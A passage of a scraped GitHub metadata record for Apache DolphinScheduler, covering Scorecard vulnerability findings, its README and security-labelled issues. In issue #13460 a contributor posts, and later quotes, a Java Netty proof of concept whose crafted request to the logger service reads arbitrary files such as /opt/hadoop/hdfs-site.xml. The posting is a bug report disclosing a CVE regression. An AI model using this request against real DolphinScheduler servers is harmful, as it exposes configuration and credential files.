                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-57j2-w4cx-62h2",
                        "Warn: Project is vulnerable to: GHSA-jjjh-jjxp-wpff",
                        "Warn: Project is vulnerable to: GHSA-rgv9-q543-rqg4",
                        "Warn: Project is vulnerable to: GHSA-4265-ccf5-phj5",
                        "Warn: Project is vulnerable to: GHSA-4g9r-vxhx-9pgx",
                        "Warn: Project is vulnerable to: GHSA-cgwf-w82q-5jrr",
                        "Warn: Project is vulnerable to: GHSA-67hx-6x53-jw92",
                        "Warn: Project is vulnerable to: GHSA-wf5p-g6vw-rhxx",
                        "Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg",
                        "Warn: Project is vulnerable to: GHSA-jchw-25xp-jwwc",
                        "Warn: Project is vulnerable to: GHSA-cxjh-pqwp-8mfp",
                        "Warn: Project is vulnerable to: GHSA-9c47-m6qq-7p4h",
                        "Warn: Project is vulnerable to: GHSA-76p3-8jx3-jpfq",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv",
                        "Warn: Project is vulnerable to: GHSA-566m-qj78-rww5",
                        "Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j",
                        "Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm",
                        "Warn: Project is vulnerable to: GHSA-c2qf-rxjj-qqgw",
                        "Warn: Project is vulnerable to: GHSA-c24v-8rfc-w8vw",
                        "Warn: Project is vulnerable to: GHSA-8jhw-289h-jh2g",
                        "Warn: Project is vulnerable to: GHSA-64vr-g452-qvp3",
                        "Warn: Project is vulnerable to: GHSA-9cwx-2883-4wfx",
                        "Warn: Project is vulnerable to: GHSA-j8xg-fqg3-53r7",
                        "Warn: Project is vulnerable to: GHSA-5mg8-w23w-74h3",
                        "Warn: Project is vulnerable to: GHSA-7g45-4rm6-3mm3"
                    ],
                    "score": 0,
                    "reason": "25 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/.github/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nThis is a project of the [Apache Software Foundation](https://apache.org) and follows the ASF [vulnerability handling process](https://apache.org/security/#vulnerability-handling).\n\n## Reporting a Vulnerability\n\nTo report a new vulnerability you have discovered please follow the [ASF vulnerability reporting process](https://apache.org/security/#reporting-a-vulnerability).\n",
        "project_all_labels": [
            "3.1.x",
            "3.2.0",
            "3.2.1",
            "3.2.2",
            "3.3.0",
            "4.0.0",
            "arch-arm64",
            "backend",
            "Bad issue",
            "bug",
            "check:docs",
            "check:tests",
            "chore",
            "CI&CD",
            "community",
            "dependencies",
            "development",
            "discussion",
            "docker",
            "document",
            "don't merge",
            "DSIP",
            "duplicate",
            "e2e",
            "enhancement",
            "FAQ",
            "feature",
            "first time contributor",
            "good first issue",
            "good idea",
            "gsoc",
            "have:design",
            "help wanted",
            "improvement",
            "incompatible",
            "kubernetes",
            "major",
            "metrics",
            "minor",
            "miss:docs",
            "miss:tests",
            "miss:ui",
            "need more information",
            "need to verify",
            "outreachy2020",
            "plug-in",
            "priority:high",
            "priority:low",
            "priority:middle",
            "Python",
            "question",
            "ready-to-close",
            "ready-to-merge",
            "reconsider-later",
            "refactor",
            "release cherry-pick",
            "roadmap",
            "security",
            "sql not sync",
            "Stale",
            "test",
            "UI",
            "user experience",
            "Waiting for reply",
            "Waiting for review",
            "Waiting for user feedback",
            "win-os",
            "wontfix"
        ],
        "README_content": "# Apache Dolphinscheduler\n\n[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)\n![codecov](https://codecov.io/gh/apache/dolphinscheduler/branch/dev/graph/badge.svg)\n[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=apache-dolphinscheduler&metric=alert_status)](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler)\n[![Twitter Follow](https://img.shields.io/twitter/follow/dolphinschedule.svg?style=social&label=Follow)](https://twitter.com/dolphinschedule) <!-- markdown-link-check-disable-line -->\n[![Slack Status](https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&style=social)](https://s.apache.org/dolphinscheduler-slack)\n[![CN doc](https://img.shields.io/badge/文档-中文版-blue.svg)](README_zh_CN.md)\n\n## About\n\nApache DolphinScheduler is the modern data orchestration platform. Agile to create high performance workflow with low-code. It is also provided powerful user interface,\ndedicated to solving complex task dependencies in the data pipeline and providing various types of jobs available **out of the box**\n\nThe key features for DolphinScheduler are as follows:\n\n- Easy to deploy, provide four ways to deploy which including Standalone, Cluster, Docker and Kubernetes.\n- Easy to use, workflow can be created and managed by four ways, which including Web UI, [Python SDK](https://dolphinscheduler.apache.org/python/main/index.html) and Open API\n- Highly reliable and high availability, decentralized architecture with multi-master and multi-worker, native supports horizontal scaling.\n- High performance, its performance is N times faster than other orchestration platform and it can support tens of millions of tasks per day\n- Cloud Native, DolphinScheduler supports orchestrating multi-cloud/data center workflow, and supports custom task type\n- Versioning both workflow and workflow instance(including tasks)\n- Various state control of workflow and task, support pause/stop/recover them in any time\n- Multi-tenancy support\n- Others like backfill support(Web UI native), permission control including project and data source\n\n## QuickStart\n\n- For quick experience\n  - Want to [start with standalone](https://dolphinscheduler.apache.org/en-us/docs/3.1.5/guide/installation/standalone)\n  - Want to [start with Docker](https://dolphinscheduler.apache.org/en-us/docs/3.1.5/guide/start/docker)\n- For Kubernetes\n  - [Start with Kubernetes](https://dolphinscheduler.apache.org/en-us/docs/3.1.5/guide/installation/kubernetes)\n- For Terraform\n  - [Start with Terraform](deploy/terraform/README.md) \n\n## User Interface Screenshots\n\n* **Homepage:** Project and workflow overview, including the latest workflow instance and task instance status statistics.\n![home](images/home.png)\n\n* **Workflow Definition:** Create and manage workflow by drag and drop, easy to build and maintain complex workflow, support [bulk of tasks](https://dolphinscheduler.apache.org/en-us/docs/3.1.5/introduction-to-functions_menu/task_menu) out of box.\n![workflow-definition](images/workflow-definition.png)\n\n* **Workflow Tree View:** Abstract tree structure could clearer understanding of the relationship between tasks\n![workflow-tree](images/workflow-tree.png)\n\n* **Data source:** Manage support multiple external data sources, provide unified data access capabilities for such as MySQL, PostgreSQL, Hive, Trino, etc.\n![data-source](images/data-source.png)\n\n* **Monitor:** View the status of the master, worker and database in real time, including server resource usage and load, do quick health check without logging in to the server.\n![monitor](images/monitor.png)\n\n## Suggestions & Bug Reports\n\nFollow [this guide](https://github.com/apache/dolphinscheduler/issues/new/choose) to report your suggestions or bugs.\n\n## Contributing\n\nThe community welcomes everyone to contribute, please refer to this page to find out more: [How to contribute](docs/docs/en/contribute/join/contribute.md),\nfind the good first issue in [here](https://github.com/apache/dolphinscheduler/contribute) if you are new to DolphinScheduler.\n\n## Community\n\nWelcome to join the Apache DolphinScheduler community by:\n\n- Join the [DolphinScheduler Slack](https://s.apache.org/dolphinscheduler-slack) to keep in touch with the community\n- Follow the [DolphinScheduler Twitter](https://twitter.com/dolphinschedule) and get the latest news <!-- markdown-link-check-disable-line -->\n- Subscribe DolphinScheduler mail list, [users@dolphinscheduler.apache.org](mailto:users-subscribe@dolphinscheduler.apache.org) for user and [dev@dolphinscheduler.apache.org](mailto:dev-subscribe@dolphinscheduler.apache.org) for developer\n\n# Landscapes\n\n<p align=\"center\">\n<br/><br/>\n<img src=\"./images/cncf-landscape-white-bg.jpg\" width=\"175\" alt=\"cncf-landscape\"/>&nbsp;&nbsp;<img src=\"./images/cncf-white-bg.jpg\" width=\"200\" alt=\"cncf-logo\"/>\n<br/><br/>\nDolphinScheduler enriches the <a href=\"https://landscape.cncf.io/?item=orchestration-management--scheduling-orchestration--dolphinscheduler\">CNCF CLOUD NATIVE Landscape.</a >\n</p >\n",
        "num_commits": 8531,
        "project_age_days": 2069,
        "project_created_at": "2019-03-01",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-25",
        "num_contributors": 363,
        "num_pull": 8237,
        "num_issues": 15871,
        "num_opening_issue": 267,
        "project_size(kB)": 242635,
        "num_stargazers": 12817,
        "num_watchers": 12817,
        "num_forks": 4608,
        "num_subscribers": 327,
        "SecurityPolicy_created_at": "2021-07-19 11:31:44",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "url": "https://github.com/apache/.github/commit/c5e16821126392a9613ee5def9d1cce56a1f64bf",
                "date": "2021-07-19 11:31:44"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/apache/dolphinscheduler/pull/15487",
                "title": "[Fix] fix switch js",
                "labels": [
                    "improvement",
                    "backend",
                    "security",
                    "ready-to-merge",
                    "3.2.1"
                ],
                "user": "caishunfeng",
                "issue_author_association": "CONTRIBUTOR",
                "number": 15487,
                "id": 2081605182,
                "state": "closed",
                "project_created_at": "2024-01-15T09:25:19Z",
                "closed_at": "2024-02-05T02:23:47Z",
                "body": "## Purpose of the pull request\r\n\r\n\r\n## Brief change log\r\n\r\n- add black key check for switch expression.\r\n\r\n## Verify this pull request\r\n\r\nHad updated UT",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) Report\nAll modified and coverable lines are covered by tests :white_check_mark:\n> Comparison is base [(`edbf5cd`)](https://app.codecov.io/gh/apache/dolphinscheduler/commit/edbf5cd3afbc64763f640203439a4f1d1423a450?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 38.10% compared to head [(`85ebc3b`)](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache) 38.13%.\n\n> :exclamation: Current head 85ebc3b differs from pull request most recent head 301c70e. Consider uploading reports for the commit 301c70e to get more accurate results\n\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@             Coverage Diff              @@\n##                dev   #15487      +/-   ##\n============================================\n+ Coverage     38.10%   38.13%   +0.02%     \n- Complexity     4698     4704       +6     \n============================================\n  Files          1304     1304              \n  Lines         44818    44823       +5     \n  Branches       4804     4806       +2     \n============================================\n+ Hits          17080    17093      +13     \n+ Misses        25884    25874      -10     \n- Partials       1854     1856       +2     \n```\n\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/apache/dolphinscheduler/pull/15487?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=apache).\n",
                        "user": "codecov-commenter",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-01-15T09:48:18Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/15487#issuecomment-1891745496"
                    },
                    {
                        "body": "## [![Quality Gate Passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/qg-passed-20px.png 'Quality Gate Passed')](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=15487) **Quality Gate passed**  \nThe SonarCloud Quality Gate passed, but some issues were introduced.\n\n[1 New issue](https://sonarcloud.io/project/issues?id=apache-dolphinscheduler&pullRequest=15487&resolved=false&inNewCodePeriod=true)  \n[0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=apache-dolphinscheduler&pullRequest=15487&resolved=false&inNewCodePeriod=true)  \n[100.0% Coverage on New Code](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15487&metric=new_coverage&view=list)  \n[0.0% Duplication on New Code](https://sonarcloud.io/component_measures?id=apache-dolphinscheduler&pullRequest=15487&metric=new_duplicated_lines_density&view=list)  \n  \n[See analysis details on SonarCloud](https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&pullRequest=15487)\n\n",
                        "user": "sonarcloud[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-05T02:21:04Z",
                        "url": "https://github.com/apache/dolphinscheduler/pull/15487#issuecomment-1926108820"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/apache/dolphinscheduler/pulls/15487",
                    "merged_at": "2024-02-05T02:23:47Z"
                }
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13986",
                "title": "[Bug] [Task Plugin] Dependent type task has security issue",
                "labels": [
                    "bug",
                    "good first issue",
                    "discussion",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 13986,
                "id": 1678166096,
                "state": "open",
                "project_created_at": "2023-04-21T09:02:18Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\n* Dependent type task does not check user permissions. Users could use dependent task to query the project / workflow / task lists of other users'.\n\n### What you expected to happen\n\n* Dependent type task should do permission checks.\n\n### How to reproduce\n\n* Create user A with project A, workflow A and task A.\r\n* Create user B.\r\n* Use user B to login DS and create a dependent task. In `add dependency` section, user B could query the project / workflow / task list of user A.\r\n\r\n![image](https://user-images.githubusercontent.com/34905992/233593763-8d59429f-4837-4663-921b-e395444b52d3.png)\r\n\n\n### Anything else\n\nrelated code:\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/5c1edd2912b63cfa57a2dc914670ffe5e0a70e09/dolphinscheduler-api/src/main/java/org/apache/dolphinscheduler/api/service/impl/ProjectServiceImpl.java#L802-L815\r\n\r\nhttps://github.com/apache/dolphinscheduler/blob/5c1edd2912b63cfa57a2dc914670ffe5e0a70e09/dolphinscheduler-dao/src/main/resources/org/apache/dolphinscheduler/dao/mapper/ProjectMapper.xml#L188-L191\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information, version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-04-21T09:02:49Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517512696"
                    },
                    {
                        "body": "I'm willing to fix this bug.",
                        "user": "huage1994",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-04-21T09:08:30Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517520809"
                    },
                    {
                        "body": "Not sure whether this is a bug or a design issue? Do you have any ideas? @SbloodyS @ruanwenjun",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:09:00Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517521554"
                    },
                    {
                        "body": "> I'm willing to fix this bug.\r\n\r\nSure",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:09:08Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517521723"
                    },
                    {
                        "body": "This was designed and modified by me. I believe that the dependency module only queries the workflow id and task id and \r\n its name, and there will be no security risks. And in a production environment, it is a very common operation for users of different projects to rely on tasks from other projects. @EricGao888 \r\n\r\n",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:17:33Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517532256"
                    },
                    {
                        "body": "> This was designed and modified by me. I believe that the dependency module only queries the workflow id and task id and its name, and there will be no security risks. And in a production environment, it is a very common operation for users of different projects to rely on tasks from other projects. @EricGao888\r\n\r\n> How to reproduce\r\nCreate user A with project A, workflow A and task A.\r\nCreate user B.\r\nUse user B to login DS and create a dependent task. In add dependency section, user B could query the project / workflow / task list of user A.\r\n\r\nNow user B is allowed to see all project. I think user B should only see the projects that they are authorized to.\r\nAn alternative scenario to the current behavior would looks like this:  \r\nFirst, User A authorizes project A to user B,  then B can get project A in query list.\r\n\r\nWDYT @EricGao888 @SbloodyS ",
                        "user": "huage1994",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-04-21T09:19:03Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517534070"
                    },
                    {
                        "body": "> Now user B is allowed to see all project. I think user B should only see the projects that they are authorized to. An alternative scenario to the current behavior would looks like this: First, User A authorizes project A to user B, then B can get project A in query list.\r\n\r\nUser B can only get all project code and its name and can not do anything else and cannot obtain other detailed information. I don't understand the benefits of restrictions.",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-21T09:25:11Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1517541425"
                    },
                    {
                        "body": "pros: dependent can dependent on some of the basic tasks that the user do can not edit or run. It is helpful when some we do not want to share our workflow to all downstream flow users.\r\ncons: feel odd when some user can search task in dependent task but can not find in project list",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T02:48:51Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519303788"
                    },
                    {
                        "body": "if we finally do not change our code, please remember add some docs for it",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T02:49:34Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519304066"
                    },
                    {
                        "body": "> cons: feel odd when some user can search task in dependent task but can not find in project list\r\n\r\nThat’s a good question.",
                        "user": "SbloodyS",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-04-24T03:11:14Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13986#issuecomment-1519319559"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13460",
                "title": "[Bug][Logger]  CVE-2022-26884 reappear",
                "labels": [
                    "bug",
                    "backend",
                    "priority:high",
                    "security"
                ],
                "user": "xxjingcd",
                "issue_author_association": "CONTRIBUTOR",
                "number": 13460,
                "id": 1563485491,
                "state": "closed",
                "project_created_at": "2023-01-31T01:58:01Z",
                "closed_at": "2024-07-18T04:18:27Z",
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar issues.\n\n\n### What happened\n\nThe pr #13280  remove the log file path verification method  which will make the  security problem CVE-2022-26884 reappear -     users can read any files by log server；\n\n### What you expected to happen\n\nThe log file read by the user should be restricted in the specified directory； \r\nRecover the check method；\n\n### How to reproduce\n\nreference [CVE-2022-26884](https://www.cve.org/CVERecord?id=CVE-2022-26884)\n\n### Anything else\n\n_No response_\n\n### Version\n\ndev\n\n### Are you willing to submit PR?\n\n- [X] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information, version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-01-31T01:58:32Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1409629255"
                    },
                    {
                        "body": "\"DS interval\" is not mean security. Due DS is a distributed system，\"DS interval\" is actually based on network communications which can be attacked easily;",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:16:07Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410246438"
                    },
                    {
                        "body": "The following code will shows how the `Logger Service` can be easily attacked ，without any restrictions；\r\n",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:16:13Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410246560"
                    },
                    {
                        "body": "```java\r\n    public static void main(String[] args) throws InterruptedException {\r\n        EventLoopGroup group = new NioEventLoopGroup();\r\n            Bootstrap b = new Bootstrap();\r\n            b.group(group)\r\n                    .channel(NioSocketChannel.class)\r\n                    .handler(new ChannelInitializer<SocketChannel>() {\r\n                        @Override\r\n                        public void initChannel(SocketChannel ch) throws Exception {\r\n                            ChannelPipeline p = ch.pipeline();\r\n                            p.addLast(new NettyDecoder(), new EchoMsgHandler());\r\n                        }\r\n                    });\r\n            // Start the client.\r\n            ChannelFuture f = b.connect(\"127.0.0.1\", 1234).sync();\r\n            Channel channel = f.channel();\r\n\r\n        // access /opt/hadoop/hdfs-site.xml\r\n        byte[] bytes = {-66, 0, 6, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 12, 123, 34, 105, 116, 101, 109, 115, 34, 58, 123, 125, 125, 0, 0, 0, 36, 123, 34, 112, 97, 116, 104, 34, 58, 34, 47, 111, 112, 116, 47, 104, 97, 100, 111, 111, 112, 47, 104, 100, 102, 115, 45, 115, 105, 116, 101, 46, 120, 109, 108, 34, 125};\r\n        ByteBuf mockAttackRequest = Unpooled.wrappedBuffer(bytes);\r\n        channel.writeAndFlush(mockAttackRequest);\r\n    }\r\n```\r\n\r\n>The  `bytes` array is the command to view  `/opt/hadoop/hdfs-site.xml`  file. And the `bytes` array  can easily be constructed by a few codes;\r\n\r\nThrough the above code,  you will get `/opt/hadoop/hdfs-site.xml` file which is not a log file from the `Master` or `Worker`； That means a hacker can access any file at any position; \r\n\r\n\"DS interval\" can be easily broken on network communications ;\r\n\r\n\r\n\r\n",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:35:42Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410270368"
                    },
                    {
                        "body": "@ruanwenjun ",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-01-31T12:43:57Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1410281143"
                    },
                    {
                        "body": "> ```java\r\n>     public static void main(String[] args) throws InterruptedException {\r\n>         EventLoopGroup group = new NioEventLoopGroup();\r\n>             Bootstrap b = new Bootstrap();\r\n>             b.group(group)\r\n>                     .channel(NioSocketChannel.class)\r\n>                     .handler(new ChannelInitializer<SocketChannel>() {\r\n>                         @Override\r\n>                         public void initChannel(SocketChannel ch) throws Exception {\r\n>                             ChannelPipeline p = ch.pipeline();\r\n>                             p.addLast(new NettyDecoder(), new EchoMsgHandler());\r\n>                         }\r\n>                     });\r\n>             // Start the client.\r\n>             ChannelFuture f = b.connect(\"127.0.0.1\", 1234).sync();\r\n>             Channel channel = f.channel();\r\n> \r\n>         // access /opt/hadoop/hdfs-site.xml\r\n>         byte[] bytes = {-66, 0, 6, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 12, 123, 34, 105, 116, 101, 109, 115, 34, 58, 123, 125, 125, 0, 0, 0, 36, 123, 34, 112, 97, 116, 104, 34, 58, 34, 47, 111, 112, 116, 47, 104, 97, 100, 111, 111, 112, 47, 104, 100, 102, 115, 45, 115, 105, 116, 101, 46, 120, 109, 108, 34, 125};\r\n>         ByteBuf mockAttackRequest = Unpooled.wrappedBuffer(bytes);\r\n>         channel.writeAndFlush(mockAttackRequest);\r\n>     }\r\n> ```\r\n> \r\n> > The  `bytes` array is the command to view  `/opt/hadoop/hdfs-site.xml`  file. And the `bytes` array  can easily be constructed by a few codes;\r\n> \r\n> Through the above code, you will get `/opt/hadoop/hdfs-site.xml` file which is not a log file from the `Master` or `Worker`； That means a hacker can access any file at any position;\r\n> \r\n> \"DS interval\" can be easily broken on network communications ;\r\n\r\nI have send the detail of this attacked example to `private@dolphinscheduler.apache.org`. @zhongjiajie",
                        "user": "xxjingcd",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-02-03T07:12:39Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13460#issuecomment-1415192912"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/13245",
                "title": "[Feature][security]Users can choose Dolphinscheduler 's encryption algorithm",
                "labels": [
                    "improvement",
                    "security"
                ],
                "user": "hdygxsj",
                "issue_author_association": "CONTRIBUTOR",
                "number": 13245,
                "id": 1506331936,
                "state": "closed",
                "project_created_at": "2022-12-21T13:53:56Z",
                "closed_at": "2023-12-07T16:40:38Z",
                "body": "### Search before asking\r\n\r\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\r\n\r\n\r\n### Description\r\n\r\nBecause each company may have its own encryption standards, for example, some companies may use rsa or aes, Chinese banks or state-owned enterprises may require the use of sm4, otherwise they will be audited, and some companies may have their own encryption algorithms, so I suggest that Dolphin Dispatch can support users to choose the encryption standard they need, or put their own encryption plug-in when deploying.\r\nThe encryption algorithm will be used in the following scenarios:\r\n1.  Encrypt spring configuration\r\n2.  Encrypt the password stored in the database\r\n3.  Encrypt the configuration information in the task\r\n4.  Encrypt passwords when transmitting them to the front and back ends\r\n\r\n### Are you willing to submit a PR?\r\n\r\n- [X] Yes I am willing to submit a PR!\r\n\r\n### Code of Conduct\r\n\r\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\r\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-12-21T13:54:24Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1361340116"
                    },
                    {
                        "body": "can you show more detail about how in config the security method, especially custom plugin from user define",
                        "user": "zhongjiajie",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-12-23T01:39:27Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1363518583"
                    },
                    {
                        "body": "> can you show more detail about how in config the security method, especially custom plugin from user define\r\n\r\nI have time to do this now, can we use spi and define some interfaces and provide default implementations. As for how to allow users to customize, my idea is to add a plugin directory and let Dolphin Scheduler go to the plugin directory to load the jar in the plugin directory at startup.\r\n",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-09-19T12:02:53Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/13245#issuecomment-1725374712"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/apache/dolphinscheduler/issues/12931",
                "title": "[Improvement][Security] Add CSRF protection",
                "labels": [
                    "UI",
                    "improvement",
                    "backend",
                    "security"
                ],
                "user": "EricGao888",
                "issue_author_association": "MEMBER",
                "number": 12931,
                "id": 1453084338,
                "state": "open",
                "project_created_at": "2022-11-17T10:21:27Z",
                "closed_at": null,
                "body": "### Search before asking\n\n- [X] I had searched in the [issues](https://github.com/apache/dolphinscheduler/issues?q=is%3Aissue) and found no similar feature requirement.\n\n\n### Description\n\n* Currently, we do not have CSRF protecting for form submission and we haven't enabled `CSRF` of Spring Security. We could enable it and improve the front end at the same time by adding `CSRF-token` to protect `DS` from `CSRF` attack.\n\n### Are you willing to submit a PR?\n\n- [ ] Yes I am willing to submit a PR!\n\n### Code of Conduct\n\n- [X] I agree to follow this project's [Code of Conduct](https://www.apache.org/foundation/policies/conduct)\n",
                "comments": [
                    {
                        "body": "Thank you for your feedback, we have received your issue, Please wait patiently for a reply.\n* In order for us to understand your request as soon as possible, please provide detailed information、version or pictures.\n* If you haven't received a reply for a long time, you can [join our slack](https://s.apache.org/dolphinscheduler-slack) and send your question to channel `#troubleshooting`",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-11-17T10:22:02Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1318411602"
                    },
                    {
                        "body": "https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html",
                        "user": "EricGao888",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-17T11:29:47Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1318497594"
                    },
                    {
                        "body": "please assign to me if no one is implementing it @EricGao888 ",
                        "user": "hdygxsj",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-28T14:15:52Z",
                        "url": "https://github.com/apache/dolphinscheduler/issues/12931#issuecomment-1329186601"
                    },
                    {
